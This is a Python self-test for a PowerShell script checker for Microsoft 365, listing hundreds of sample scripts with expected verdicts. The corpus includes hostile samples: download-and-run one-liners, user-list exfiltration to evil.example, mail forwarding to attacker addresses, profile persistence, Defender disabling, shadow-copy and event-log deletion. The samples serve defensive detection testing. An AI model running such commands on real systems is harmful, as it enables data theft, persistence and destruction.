#!/usr/bin/env python3
"""Self-check for m365check: a hostile corpus plus the repo's own audit script.

Run:  python3 developers/test_m365check.py
Each case is (name, script text, expected verdict, expected substring in a
finding). No framework; an assert that fails names the case.
"""
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))
import m365check  # noqa: E402

C = m365check.Checker()
L = m365check.LEVEL_NAMES

CASES = [
    # --- plain reads ---
    ('graph read', "Get-MgUser -All | Select-Object DisplayName", 'READ-ONLY', 'reads in Microsoft Graph'),
    ('exo read', "Get-EXOMailbox -ResultSize Unlimited | Where-Object { $_.RecipientTypeDetails -eq 'SharedMailbox' }", 'READ-ONLY', 'Exchange Online'),
    ('graph request GET', "Invoke-MgGraphRequest -Method GET -Uri 'https://graph.microsoft.com/v1.0/users'", 'READ-ONLY', 'HTTP GET'),
    ('graph request default method', "Invoke-MgGraphRequest -Uri '/v1.0/users'", 'READ-ONLY', 'HTTP GET'),
    ('graph relative path no slash', "Invoke-MgGraphRequest -Method GET -Uri 'v1.0/organization?$select=id' -OutputType PSObject", 'READ-ONLY', 'HTTP GET at graph.microsoft.com'),
    ('graph beta path no slash', "Invoke-MgGraphRequest -Uri 'beta/users'", 'READ-ONLY', 'HTTP GET at graph.microsoft.com'),
    ('graph relative DELETE no slash', "Invoke-MgGraphRequest -Method DELETE -Uri 'v1.0/groups/1'", 'DESTRUCTIVE', 'HTTP DELETE at graph.microsoft.com'),
    ('graph scheme-less host', "Invoke-MgGraphRequest -Uri 'graph.microsoft.com/v1.0/users'", 'READ-ONLY', 'HTTP GET at graph.microsoft.com'),
    ('web cmdlet scheme-less host', "Invoke-RestMethod -Uri 'graph.microsoft.com/v1.0/users' -Headers $h", 'READ-ONLY', 'HTTP GET at graph.microsoft.com'),
    ('web cmdlet relative path is not Graph', "Invoke-WebRequest -Method POST -Uri 'v1.0/users' -Body $b", 'SUSPICIOUS', 'sends data to v1.0'),
    ('connect read scopes', "Connect-MgGraph -Scopes 'User.Read.All','Policy.Read.All' -TenantId $t", 'READ-ONLY', 'signs in'),
    ('whatif downgrade', "Remove-MgUser -UserId x -WhatIf", 'READ-ONLY', '-WhatIf'),
    # --- writes ---
    ('graph write', "Update-MgUser -UserId $u -AccountEnabled:$false", 'CHANGES', 'changes something in Microsoft Graph'),
    ('exo write', "Set-Mailbox -Identity $m -ForwardingSmtpAddress 'x@evil.example'", 'CHANGES', 'Exchange Online'),
    ('graph request POST', "Invoke-MgGraphRequest -Method POST -Uri '/v1.0/users' -Body $b", 'CHANGES', 'HTTP POST'),
    ('splat literal write', "$p = @{ Method = 'PATCH'; Uri = '/v1.0/users/x' }\nInvoke-MgGraphRequest @p", 'CHANGES', 'HTTP PATCH'),
    ('splat via variable', "$m = 'PATCH'\n$p = @{ Method = $m; Uri = '/v1.0/users/x' }\nInvoke-MgGraphRequest @p", 'CHANGES', 'HTTP PATCH'),
    ('licence', "Set-MgUserLicense -UserId x -AddLicenses @{SkuId=$s} -RemoveLicenses @()", 'CHANGES', 'licences'),
    ('install module', "Install-Module Microsoft.Graph -Scope CurrentUser", 'CHANGES', 'on your computer'),
    # --- destructive ---
    ('graph delete', "Get-MgUser -Filter \"department eq 'x'\" | Remove-MgUser", 'DESTRUCTIVE', 'deletes or clears'),
    ('graph request DELETE', "Invoke-MgGraphRequest -Method DELETE -Uri '/v1.0/groups/1'", 'DESTRUCTIVE', 'HTTP DELETE'),
    ('search-mailbox delete', "Search-Mailbox -Identity x -SearchQuery 'subject:phish' -DeleteContent -Force", 'DESTRUCTIVE', 'deletes mail'),
    ('search-mailbox log only', "Search-Mailbox -Identity x -SearchQuery 'subject:phish' -LogOnly", 'READ-ONLY', 'Exchange Online'),
    ('purge', "New-ComplianceSearchAction -SearchName s -Purge -PurgeType HardDelete", 'DESTRUCTIVE', 'purges'),
    ('local recurse', "Remove-Item C:\\Temp\\out -Recurse -Force", 'DESTRUCTIVE', 'folder tree'),
    ('alias rm', "rm -r ./out", 'DESTRUCTIVE', 'alias for Remove-Item'),
    # --- cannot tell ---
    ('method variable', "$method = 'POST'\nInvoke-RestMethod -Method $method -Uri 'https://graph.microsoft.com/v1.0/me'", 'CHANGES', 'HTTP POST'),
    ('method truly dynamic', "Invoke-RestMethod -Method (Get-Content m.txt) -Uri 'https://graph.microsoft.com/v1.0/me'", 'CANNOT TELL', 'decided when the script runs'),
    ('uri variable unknown', "Invoke-RestMethod -Uri $uri -Method POST -Body $data", 'CANNOT TELL', 'host decided when the script runs'),
    ('dynamic command', "$cmd = Get-Content cmd.txt\n& $cmd -UserId x", 'CANNOT TELL', 'chosen when the script runs'),
    ('splat unresolved', "Invoke-MgGraphRequest @args", 'CANNOT TELL', 'splatted'),
    ('start-process', "Start-Process notepad.exe", 'CANNOT TELL', 'starts another program'),
    ('invoke-command', "Invoke-Command -ComputerName srv -ScriptBlock { Get-Process }", 'READ-ONLY', 'checked on their own lines'),
    ('other script', "pwsh -File .\\no-such-audit.ps1", 'CANNOT TELL', 'cannot find or read here'),
    ('script path from a variable', '& "$HOME/no-such-dir/x.ps1" -Mailbox a@b.c', 'CANNOT TELL', 'cannot find or read here'),
    ('unknown Get is not green', "Get-SomethingNobodyKnows -Online", 'CANNOT TELL', 'is not proof that it only reads'),
    ('autopilot online', "Get-WindowsAutopilotInfo -Online -Assign", 'CHANGES', 'Windows Autopilot'),
    ('autopilot by path, not here', '& "C:/no-such-dir/Get-WindowsAutopilotInfo.ps1" -Online', 'CANNOT TELL', 'Windows Autopilot'),
    ('autopilot by name only is never green', '& "C:/no-such-dir/Get-WindowsAutopilotInfo.ps1" -OutputFile h.csv', 'CANNOT TELL', 'judged by the script name'),
    ('autopilot from a runtime folder', "$dir = Read-Host 'where'\n& \"$dir/Get-WindowsAutopilotInfo.ps1\"", 'CANNOT TELL', 'judged by the script name'),
    ('autopilot dynamic splat', "Get-WindowsAutopilotInfo @args", 'CANNOT TELL', 'hardware hash'),
    ('unknown-scope delete is still a delete', "Remove-FrobPolicy -Identity x", 'DESTRUCTIVE', 'deletes'),
    ('forwarding by splat', "$p = @{Identity='ceo'; ForwardingSmtpAddress='x@evil.example'}\nSet-Mailbox @p", 'CHANGES', 'mail forwarding'),
    ('forwarding by prefix', "Set-Mailbox ceo -ForwardingSmtp 'x@evil.example'", 'CHANGES', 'mail forwarding'),
    ('script on a share is not opened', '& "\\\\attacker.example\\share\\a.ps1"', 'CANNOT TELL', 'cannot find or read here'),
    ('autopilot to file', "Get-WindowsAutopilotInfo -OutputFile hash.csv", 'READ-ONLY', 'hardware hash'),
    ('request verb writes', "Request-SPOPersonalSite -UserEmails 'a@b.example'", 'CHANGES', 'SharePoint Online'),
    ('import verb writes', "Import-RecipientDataProperty -Identity x -Picture -FileData $b", 'CHANGES', 'Exchange Online'),
    ('transport rule import replaces all', "Import-TransportRuleCollection -FileData $b", 'DESTRUCTIVE', 'replaces every mail flow rule'),
    ('connect-mailbox is not a sign-in', "Connect-Mailbox -Identity x -Database d -User u", 'CHANGES', 'full access to a mailbox'),
    ('risky user compromised', "Confirm-MgRiskyUserCompromised -UserIds $ids", 'CHANGES', 'Entra ID Protection'),
    ('checkMemberGroups stays a read', "Confirm-MgUserMemberGroup -UserId x -GroupIds $g", 'READ-ONLY', 'Microsoft Graph'),
    ('quarantine delete', "Delete-QuarantineMessage -Identity $id", 'DESTRUCTIVE', 'Exchange Online'),
    ('quarantine release', "Release-QuarantineMessage -Identity $id -ReleaseToAll", 'CHANGES', 'releases quarantined mail'),
    ('pnp folder created', "Resolve-PnPFolder -SiteRelativePath 'a/b'", 'CHANGES', 'creates the SharePoint folder'),
    ('activation lock bypass', "Skip-MgDeviceManagementManagedDeviceActivationLock -ManagedDeviceId x", 'CHANGES', 'Activation Lock'),
    ('call operator block', "& { Remove-MgUser -UserId x }", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('dot-source block', ". { Remove-MgUser -UserId x }", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('graph batch delete', "Invoke-MgGraphRequest -Method POST -Uri '/v1.0/$batch' -Body '{\"requests\":[{\"id\":\"1\",\"method\":\"DELETE\",\"url\":\"/users/x\"}]}'", 'DESTRUCTIVE', '$batch (DELETE)'),
    ('graph batch unread', "Invoke-MgGraphRequest -Method POST -Uri '/v1.0/$batch' -Body $b", 'CANNOT TELL', '$batch'),
    ('csom delete', "$list = $ctx.Web.Lists.GetByTitle('Docs'); $list.DeleteObject(); $ctx.ExecuteQuery()", 'DESTRUCTIVE', 'CSOM'),
    ('pnp object delete', "(Get-PnPList -Identity Docs).DeleteObject(); Invoke-PnPQuery", 'DESTRUCTIVE', 'CSOM'),
    ('.NET delete beside a tenant read', "[IO.File]::Delete('C:/data/x.db'); Get-MgUser -Top 1", 'CHANGES', 'through .NET'),
    ('batch spaced delete beside a GET', "Invoke-MgGraphRequest -Method POST -Uri '/v1.0/$batch' -Body '{\"requests\":[{\"id\":\"1\",\"method\":\"GET\",\"url\":\"/me\"},{\"id\":\"2\",\"method\" : \"DELETE\",\"url\":\"/users/x\"}]}'", 'DESTRUCTIVE', '$batch (DELETE, GET)'),
    ('batch escaped method is unread', "Invoke-MgGraphRequest -Method POST -Uri '/v1.0/$batch' -Body '{\"requests\":[{\"id\":\"1\",\"method\":\"GET\",\"url\":\"/me\"},{\"id\":\"2\",\"method\":\"\\u0044ELETE\",\"url\":\"/users/x\"}]}'", 'DESTRUCTIVE', '$batch (DELETE, GET)'),
    ('batch request without a method', "Invoke-MgGraphRequest -Method POST -Uri '/v1.0/$batch' -Body '{\"requests\":[{\"id\":\"1\",\"method\":\"GET\",\"url\":\"/me\"},{\"id\":\"2\",\"url\":\"/users/x\"}]}'", 'CANNOT TELL', '$batch'),
    ('batch url mentioning DELETE', "Invoke-MgGraphRequest -Method POST -Uri '/v1.0/$batch' -Body '{\"requests\":[{\"id\":\"1\",\"method\":\"GET\",\"url\":\"/x?method=DELETE\"}]}'", 'READ-ONLY', '$batch (GET)'),
    ('csom lower case', "$l.deleteobject(); $ctx.ExecuteQuery()", 'DESTRUCTIVE', 'CSOM'),
    ('csom delete with parameters', "$i.DeleteWithParameters($p)", 'DESTRUCTIVE', 'CSOM'),
    ('indexed delete method', "$a[0].Delete()", 'CHANGES', '.Delete()'),
    ('msol federation switch', "Convert-MsolDomainToFederated -DomainName contoso.example", 'CHANGES', 'signs in'),
    ('azuread domain verify', "Confirm-AzureADDomain -Name contoso.example", 'CHANGES', 'verifies a domain'),
    ('sso password read', "Get-MgGroupPasswordSingleSignOnCredential -GroupId x", 'READ-ONLY', 'single sign-on'),
    ('forwarding set', "Set-Mailbox -Identity m -ForwardingSmtpAddress 'x@y.z'", 'CHANGES', 'mail forwarding'),
    ('get-content iex wrapper', "Get-Content $HOME/Downloads/audit.ps1 -Raw | Invoke-Expression", 'CANNOT TELL', 'runs the script file'),
    ('unknown verb', "Frobnicate-MgUser -UserId x", 'CANNOT TELL', 'not a standard PowerShell verb'),
    ('gam inside', "gam print users", 'CANNOT TELL', 'GAM Script Checker'),
    ('empty', "# nothing here\n", 'CANNOT TELL', 'found nothing it can read'),
    # --- suspicious ---
    ('iex download', "iex (New-Object Net.WebClient).DownloadString('https://x.example/a.ps1')", 'SUSPICIOUS', 'downloaded'),
    ('iwr pipe iex', "Invoke-WebRequest 'https://x.example/a.ps1' | Invoke-Expression", 'SUSPICIOUS', 'downloaded'),
    ('exfil POST', "Get-MgUser -All | ConvertTo-Json | Invoke-RestMethod -Uri 'https://evil.example/upload' -Method POST", 'SUSPICIOUS', 'sends data to evil.example'),
    ('exfil GET with body', "Invoke-WebRequest -Uri 'https://evil.example/u' -Body $json", 'SUSPICIOUS', 'sends data to'),
    ('add-type', "Add-Type -TypeDefinition $src", 'SUSPICIOUS', 'compiles'),
    ('reflection', "[System.Reflection.Assembly]::Load($bytes)", 'SUSPICIOUS', 'assembly'),
    ('scriptblock create', "$sb = [ScriptBlock]::Create($text); & $sb", 'SUSPICIOUS', 'runnable code'),
    ('encoded', "powershell -EncodedCommand SQBFAFgA", 'SUSPICIOUS', 'hidden'),
    ('mshta', "mshta https://x.example/a.hta", 'SUSPICIOUS', 'mshta'),
    # --- security lines ---
    ('forwarding', "Set-Mailbox -Identity x -ForwardingSmtpAddress y -DeliverToMailboxAndForward $true", 'CHANGES', 'forwarding'),
    ('inbox rule', "New-InboxRule -Mailbox x -Name r -MoveToFolder 'x:\\RSS Feeds'", 'CHANGES', 'inbox rule'),
    ('mailbox permission', "Add-MailboxPermission -Identity x -User y -AccessRights FullAccess", 'CHANGES', 'access to a mailbox'),
    ('role grant', "New-MgDirectoryRoleMemberByRef -DirectoryRoleId r -BodyParameter $b", 'CHANGES', 'admin role'),
    ('app secret', "Add-MgApplicationPassword -ApplicationId a", 'CHANGES', 'app registration'),
    ('ca policy', "Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId p -State disabled", 'CHANGES', 'security policy'),
    ('plaintext secret', "$sec = ConvertTo-SecureString 'P@ss' -AsPlainText -Force", 'READ-ONLY', 'credential'),
    ('write scopes', "Connect-MgGraph -Scopes 'User.ReadWrite.All','Directory.AccessAsUser.All'", 'READ-ONLY', 'not read-only'),
    ('create scopes are not read', "Connect-MgGraph -Scopes 'Group.Create','User.Invite.All','Exchange.ManageAsApp','User.EnableDisableAccount.All'", 'READ-ONLY', 'not read-only: Group.Create, User.Invite.All, Exchange.ManageAsApp, User.EnableDisableAccount.All'),
    ('default scope', "Connect-MgGraph -Scopes '.default'", 'READ-ONLY', 'every permission this app was ever granted'),
    ('rolemanagement read is not write', "Connect-MgGraph -Scopes 'RoleManagement.Read.Directory'", 'READ-ONLY', 'read-only scopes'),
    ('execution policy', "Set-ExecutionPolicy Bypass -Scope Process", 'CHANGES', 'script protection'),
    ('audit off', "Set-Mailbox -Identity x -AuditEnabled $false", 'CHANGES', 'audit'),
    # --- undo ---
    ('undo user', "Remove-MgUser -UserId x", 'DESTRUCTIVE', 'restore a deleted user'),
    ('undo site', "Remove-SPOSite -Identity https://x.sharepoint.com/sites/a", 'DESTRUCTIVE', '93 days'),
    # --- noise that must NOT be a finding ---
    ('hashtable keys', "$row = [pscustomobject]@{\n    DisplayName = $u.DisplayName\n    IsAdmin     = $true\n}", 'CANNOT TELL', 'found nothing it can read'),
    ('switch default', "switch ($x) { 'a' { 1 } default { 2 } }", 'CANNOT TELL', 'found nothing it can read'),
    ('foreach keyword', "foreach ($u in $users) { Write-Host $u }", 'CANNOT TELL', 'found nothing it can read'),
    ('string with cmdlet name', "Write-Host \"run Remove-MgUser yourself\"", 'CANNOT TELL', 'found nothing it can read'),
    # --- evasions and blind spots found in the 2026-09-15 audit ---
    ('alias shadow', "Set-Alias Get-MgUser Remove-MgUser\nGet-MgUser -UserId x", 'SUSPICIOUS', 'renames a command'),
    ('alias drive', "Set-Item Alias:Get-MgUser Remove-MgUser\nGet-MgUser -UserId x", 'SUSPICIOUS', 'defines or renames a command'),
    ('&& chain', "Get-MgUser -UserId x && Remove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('profile persistence', 'Add-Content $PROFILE "iex (irm https://evil.example/a)"\nGet-MgUser -All', 'SUSPICIOUS', 'looks like PowerShell code'),
    ('profile plain write', 'Add-Content $PROFILE "Set-Location ~"', 'CHANGES', 'persistence'),
    ('run key', "New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name u -Value 'notepad'", 'CHANGES', 'persistence'),
    ('hosts file', "Add-Content C:\\Windows\\System32\\drivers\\etc\\hosts '1.2.3.4 login.microsoftonline.com'", 'CHANGES', 'hosts file'),
    ('trusted hosts', "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value '*'", 'CHANGES', 'TrustedHosts'),
    ('export to share', "Get-MgUser -All | Export-Csv '\\\\evil\\share\\users.csv'", 'CANNOT TELL', 'network share'),
    ('download then run', "Invoke-WebRequest -Uri 'https://evil.example/a.exe' -OutFile a.exe\n& .\\a.exe", 'SUSPICIOUS', 'a file this script downloaded'),
    ('bits then run', "Start-BitsTransfer -Source 'https://evil.example/t.exe' -Destination C:\\t\\t.exe\nStart-Process C:\\t\\t.exe", 'SUSPICIOUS', 'downloaded'),
    ('github exfil', "Get-MgUser -All | ConvertTo-Json | Invoke-RestMethod -Uri 'https://api.github.com/gists' -Method POST", 'SUSPICIOUS', 'code-hosting'),
    ('github download is not exfil', "Invoke-WebRequest 'https://raw.githubusercontent.com/x/y/a.ps1' -OutFile a.ps1", 'CANNOT TELL', 'downloads from raw.githubusercontent.com'),
    ('sharepoint post', "Invoke-RestMethod -Uri 'https://attacker.sharepoint.com/x' -Method POST -Body $json", 'CHANGES', 'any Microsoft 365 tenant can own'),
    ('graph url with variable', 'Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users/$id" -Headers $h', 'READ-ONLY', 'graph.microsoft.com'),
    ('evil url with variable', 'Invoke-RestMethod -Uri "https://evil.example/u/$id" -Method POST -Body $b', 'SUSPICIOUS', 'evil.example'),
    ('whatif from variable', "$w = $false\nRemove-MgUser -UserId x -WhatIf:$w", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('process start', '[System.Diagnostics.Process]::Start("cmd.exe", "/c whoami")', 'SUSPICIOUS', 'starts a program'),
    ('wscript shell', "(New-Object -ComObject WScript.Shell).Run('calc.exe')", 'SUSPICIOUS', 'COM object'),
    ('invokescript', '$ExecutionContext.InvokeCommand.InvokeScript($code)', 'SUSPICIOUS', 'runnable code'),
    ('webrequest create', '[System.Net.HttpWebRequest]::Create("https://evil.example")', 'SUSPICIOUS', 'network connection'),
    ('cim process create', "Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='calc'}", 'CANNOT TELL', 'Win32_Process'),
    ('defender off', "Set-MpPreference -DisableRealtimeMonitoring $true", 'CHANGES', 'real-time protection'),
    ('psremoting', "Enable-PSRemoting -Force", 'CHANGES', 'WinRM'),
    ('unblock', "Unblock-File .\\tool.ps1", 'CHANGES', 'warning'),
    ('invoke-item exe', "Invoke-Item .\\setup.exe", 'CANNOT TELL', 'default program'),
    ('bare relative exe', ".\\setup.exe /S", 'CANNOT TELL', 'runs the file'),
    ('module from path', "Import-Module .\\helpers.psm1", 'CANNOT TELL', 'runs the module'),
    ('module qualified', "Microsoft.Graph\\Remove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('command from literal variable', "$c = 'Remove-MgUser'\n& $c -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('gci recurse pipe', "Get-ChildItem C:\\Users -Recurse | Remove-Item -Force", 'DESTRUCTIVE', 'folder tree'),
    ('send mail security', "Send-MgUserMail -UserId x -BodyParameter $m", 'CHANGES', 'sends email'),
    ('plaintext password', "$c = Get-Credential\n$p = $c.GetNetworkCredential().Password", 'CANNOT TELL', 'plain text'),
    ('confirm false note', "Remove-MgGroup -GroupId g -Confirm:$false", 'DESTRUCTIVE', 'will not ask'),
    ('requires admin', "#Requires -RunAsAdministrator\nGet-MgUser -All", 'READ-ONLY', 'Administrator rights'),
    ('line number after blank line', "Get-MgUser -All\n\nRemove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('comment with cmdlet', "# Remove-MgUser -UserId x\nGet-MgUser -UserId x", 'READ-ONLY', 'reads in Microsoft Graph'),
    ('here-string with cmdlet', "$t = @\"\nRemove-MgUser\n\"@\nGet-MgUser -UserId x", 'READ-ONLY', 'reads in Microsoft Graph'),
    ('backtick continuation', "Get-MgUser -All `\n  -Filter 'accountEnabled eq true'", 'READ-ONLY', 'reads in Microsoft Graph'),
    # --- misses from the real corpus (developers/corpus/real/RESULTS.md, 2026-09-16) ---
    ('property list after a comma', "Get-MgUser -All | Select-Object DisplayName, UserPrincipalName, Id", 'READ-ONLY', 'reads in Microsoft Graph'),
    ('attribute argument', "param([Parameter(Mandatory)][string]$Upn)\nGet-MgUser -UserId $Upn", 'READ-ONLY', 'reads in Microsoft Graph'),
    ('AD filter block', "Get-ADUser -Filter {UserPrincipalName -eq $upn}", 'READ-ONLY', 'Get-ADUser'),
    ('call to a function in this file', "function Make-Report { Get-MgUser -All }\nMake-Report", 'READ-ONLY', 'reads in Microsoft Graph'),
    ('Get- function whose body deletes', "function Get-Cleanup { Remove-MgUser -UserId x }\nGet-Cleanup", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('session-only cmdlets', "Clear-Host\nRemove-Module AzureAD\nRemove-PSSession $s\nGet-MgUser -All", 'READ-ONLY', 'reads in Microsoft Graph'),
    ('framework assembly by name', "Add-Type -AssemblyName System.Web\nGet-MgUser -All", 'READ-ONLY', 'System.Web'),
    ('assembly name plus source', "Add-Type -AssemblyName System.Web -TypeDefinition $src", 'SUSPICIOUS', 'compiles'),
    ('assembly from a path', "Add-Type -Path .\\helper.dll", 'SUSPICIOUS', 'compiles'),
    ('LoadWithPartialName', "[Reflection.Assembly]::LoadWithPartialName('System.Web')\nGet-MgUser -All", 'READ-ONLY', 'reads in Microsoft Graph'),
    ('remove a function', "Remove-Item -Path 'Function:\\Get-AdminAuditLogConfig' -Force", 'CHANGES', 'removes a function or alias'),
    ('alias that keeps its meaning', "Set-Alias -Name clear -Value Clear-Host", 'CHANGES', 'creates an alias'),
    ('short alias to a read', "Set-Alias ll Get-ChildItem", 'CHANGES', 'creates an alias'),
    ('known alias pointed elsewhere', "Set-Alias ls Remove-Item", 'SUSPICIOUS', 'renames a command'),
    ('function copied to a new name', "Get-Item function:Clear-Host | Set-Item function:__clearhost", 'CHANGES', 'creates an alias or function'),
    ('module path in a variable', "$p = Join-Path $PSScriptRoot 'Support.psm1'\nImport-Module -Name $p", 'CANNOT TELL', 'loads code from a file'),
    ('module name in a loop', "foreach ($m in 'MSOnline', 'AzureAD') { Import-Module $m }", 'READ-ONLY', 'loads a module'),
    ('self-elevation', "Start-Process powershell -Verb RunAs -ArgumentList \"-File `\"$PSCommandPath`\"\"", 'READ-ONLY', 'this same script'),
    ('self-elevation via variable', "$a = \"& '\" + $myinvocation.mycommand.definition + \"'\"\nStart-Process powershell -Verb runAs -ArgumentList $a", 'READ-ONLY', 'this same script'),
    ('elevating another script', "Start-Process powershell -Verb RunAs -ArgumentList '-File C:\\other.ps1'", 'CANNOT TELL', 'starts another program'),
    ('open the report it wrote', "[string]$path = \"C:\\Reports\\MFA-$(Get-Date -Format 'yyyy').csv\"\nInvoke-Item $path", 'READ-ONLY', 'opens a report'),
    ('invoke-command literal block', "Invoke-Command -ComputerName srv -ScriptBlock { Start-ADSyncSyncCycle -PolicyType Delta }", 'CHANGES', 'Start-ADSyncSyncCycle'),
    ('invoke-command block from a variable', "Invoke-Command -ComputerName srv -ScriptBlock $sb", 'CANNOT TELL', 'cannot follow'),
    ('cmdlet inside a string subexpression', "Get-MgUser -All\nWrite-Host \"Removed $(Remove-MgUser -UserId x)\"", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('cmdlet inside a here-string subexpression', "$b = @\"\n<x>$(Remove-MgUser -UserId x)</x>\n\"@\nGet-MgUser -All", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('nested quotes in a subexpression', "Write-Host \"On $(Get-Date -Format \"yyyy\")\"\nRemove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('non-breaking space indent', "foreach ($g in $groups) {\n\u00a0 \u00a0 Remove-MgGroupMember -GroupId $g.Id -DirectoryObjectId $u\n}", 'DESTRUCTIVE', 'Remove-MgGroupMember'),
    ('en dash parameter', "Search-Mailbox -Identity x -SearchQuery 'subject:phish' \u2013DeleteContent", 'DESTRUCTIVE', 'deletes mail'),
    ('apostrophe inside curly quotes', "Write-Host \u201cDon't stop\u201d\nRemove-MgUser -UserId x\nWrite-Host 'done'", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('pnp rest GET', "Invoke-PnPSPRestMethod -Url $nextLink -Method Get", 'READ-ONLY', 'HTTP GET'),
    ('pnp graph DELETE', "Invoke-PnPGraphMethod -Url 'v1.0/groups/1' -Method Delete", 'DESTRUCTIVE', 'HTTP DELETE'),
    ('pnp rest method variable', "Invoke-PnPSPRestMethod -Url $u -Method $m", 'CANNOT TELL', 'decided when the script runs'),
    ('exchange remote session', "$s = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https://outlook.office365.com/powershell-liveid/\nImport-PSSession $s\nGet-Mailbox -ResultSize 10", 'READ-ONLY', 'remote PowerShell session'),
    ('property list continued by backticks', "$r | Select-Object `\n    DisplayName, `\n    UserPrincipalName\nGet-MgUser -All", 'READ-ONLY', 'reads in Microsoft Graph'),
    ('property list continued by commas', "$r | Select-Object DisplayName,\n    UserPrincipalName,\n    Mail\nGet-MgUser -All", 'READ-ONLY', 'reads in Microsoft Graph'),
    ('switch after a comma continuation', "Search-Mailbox -Identity a,\n    b -SearchQuery 'x' -DeleteContent", 'DESTRUCTIVE', 'deletes mail'),
    ('vssadmin delete', "vssadmin delete shadows /all /quiet", 'DESTRUCTIVE', 'shadow copies'),
    ('vssadmin list', "vssadmin list shadows", 'CANNOT TELL', 'vssadmin'),
    ('wevtutil clear', "wevtutil el | ForEach-Object { wevtutil cl \"$_\" }", 'DESTRUCTIVE', 'event log'),
    ('call to a copied function', "Get-Item function:Clear-Host | Set-Item function:__clearhost\n__clearhost", 'CHANGES', 'creates an alias or function'),
    ('call to a disguising alias', "Set-Alias Get-Report Remove-MgUser\nGet-Report -UserId x", 'SUSPICIOUS', 'renames a command'),
    ('graph inbox rule by URI', "Invoke-MgGraphRequest -Method POST -Uri '/v1.0/me/mailFolders/inbox/messageRules' -Body $r", 'CHANGES', 'inbox rule'),
    # --- 0.5.1 review: parsing layer ---
    ('hash inside a token is not a comment', "Invoke-MgGraphRequest -Uri 'https://graph.microsoft.com/v1.0/users/abc#x' -Method DELETE", 'DESTRUCTIVE', 'HTTP DELETE'),
    ('hash inside a bare url is not a comment', "Invoke-MgGraphRequest -Uri https://graph.microsoft.com/v1.0/users/abc#x -Method DELETE", 'DESTRUCTIVE', 'HTTP DELETE'),
    ('hash inside a path is not a comment', "Remove-Item C:\\Temp\\data#old -Recurse", 'DESTRUCTIVE', 'folder tree'),
    ('hash after a space is still a comment', "Get-MgUser -All # Remove-MgUser -UserId x", 'READ-ONLY', 'reads in Microsoft Graph'),
    ('custom method', "Invoke-RestMethod -Uri 'https://graph.microsoft.com/v1.0/users/x' -CustomMethod DELETE", 'DESTRUCTIVE', 'HTTP DELETE'),
    ('custom method MERGE', "Invoke-RestMethod -Uri 'https://graph.microsoft.com/v1.0/users/x' -CustomMethod MERGE", 'CHANGES', 'HTTP MERGE'),
    ('using module', "using module .\\no-such.psm1\nGet-MgUser", 'CANNOT TELL', 'cannot find or read'),
    ('using namespace is nothing', "using namespace System.Text\nGet-MgUser", 'READ-ONLY', 'reads in Microsoft Graph'),
    ('parameters after a here-string', "Set-Content -Value @\"\nhello\n\"@ -Path $profile", 'CHANGES', 'runs automatically at every start'),
    ('here-string keeps line numbers', "$t = @\"\na\nb\n\"@\nRemove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('vertical tab indent', "Get-MgUser\n\x0bRemove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('NEL indent', "Get-MgUser\n\x85Remove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('statement after a block', "if ($true) { Get-MgUser -All } Remove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('word after an argument block is an argument', "bcdedit /enum {current}\nGet-MgUser", 'CANNOT TELL', 'bcdedit'),
    ('hash after a quote is a comment', "Get-MgUser 'a'#'\nRemove-MgUser -UserId x\n#'", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('hash after a variable is a comment', "Write-Host $x#'\nRemove-MgUser -UserId x\n#'", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('statement after catch block', "try { Get-MgUser } catch { Write-Host e } Remove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('injected here-string marker', "Set-Content -Value @\"\nhi\n\"@\x1f\nRemove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('reassigned after a semicolon', "$m = 'GET'; $m = 'DELETE'\nInvoke-MgGraphRequest -Uri /v1.0/users/abc -Method $m", 'CANNOT TELL', 'decided when the script runs'),
    ('reassigned inside a block', "$m = 'GET'\nif ($env:X -eq 'y') { $m = 'DELETE' }\nInvoke-MgGraphRequest -Uri /v1.0/users/abc -Method $m", 'CANNOT TELL', 'decided when the script runs'),
    ('reassigned with a type', "$m = 'GET'\n[string]$m = 'DELETE'\nInvoke-MgGraphRequest -Uri /v1.0/users/abc -Method $m", 'CANNOT TELL', 'decided when the script runs'),
    ('reassigned with a scope', "$m = 'GET'\n$script:m = 'DELETE'\nInvoke-MgGraphRequest -Uri /v1.0/users/abc -Method $m", 'CANNOT TELL', 'decided when the script runs'),
    ('reassigned by Set-Variable', "$m = 'GET'\nSet-Variable -Name m -Value 'DELETE'\nInvoke-MgGraphRequest -Uri /v1.0/users/abc -Method $m", 'CANNOT TELL', 'decided when the script runs'),
    ('reassigned by multiple assignment', "$m = 'GET'\n$m, $n = 'DELETE', 1\nInvoke-MgGraphRequest -Uri /v1.0/users/abc -Method $m", 'CANNOT TELL', 'decided when the script runs'),
    ('single literal assignment still resolves', "$m = 'PATCH'\nInvoke-MgGraphRequest -Uri /v1.0/users/x -Method $m", 'CHANGES', 'HTTP PATCH'),
